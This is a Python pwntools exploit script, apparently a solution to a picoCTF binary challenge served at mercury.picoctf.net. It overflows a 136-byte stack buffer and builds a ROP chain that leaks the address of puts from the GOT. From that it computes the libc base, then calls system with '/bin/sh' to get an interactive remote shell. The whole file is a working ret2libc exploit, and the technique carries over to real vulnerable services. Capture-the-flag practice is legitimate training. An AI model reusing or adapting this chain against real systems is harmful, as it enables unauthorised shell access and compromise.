#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 62289 ./vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 62289)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

offset = 136
do_stuff = 0x4006d8
pop_rdi = 0x400913      # ropper --file vuln --search "pop rdi"
pop_rsi = 0x400911      # ropper --file vuln --search "pop rsi ; pop r15 ; ret"
puts_got = 0x601018     # puts in the got.plt
puts_plt = 0x400540     # puts in the plt

io = start()

payload = flat(
    b"A" * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    do_stuff
)

# write("payload", payload)
io.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)

io.recvlines(2)
puts_got_leak = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leak addr: %#x", puts_got_leak)

# readelf -s libc.so.6 | grep "puts"
libc_base = puts_got_leak - 0x80a30
info("libc base addr: %#x", libc_base)

# strings -a -t x libc.so.6 | grep "/bin/sh"
binsh = libc_base + 0x1b40fa
# readelf -s libc.so.6 | grep "system"
system = libc_base + 0x4f4e0

payload = flat(
    b"A" * offset,
    pop_rsi,
    p64(0),
    p64(0),
    pop_rdi,
    binsh,
    system
)

write("payload", payload)

io.sendline(payload)

io.interactive()

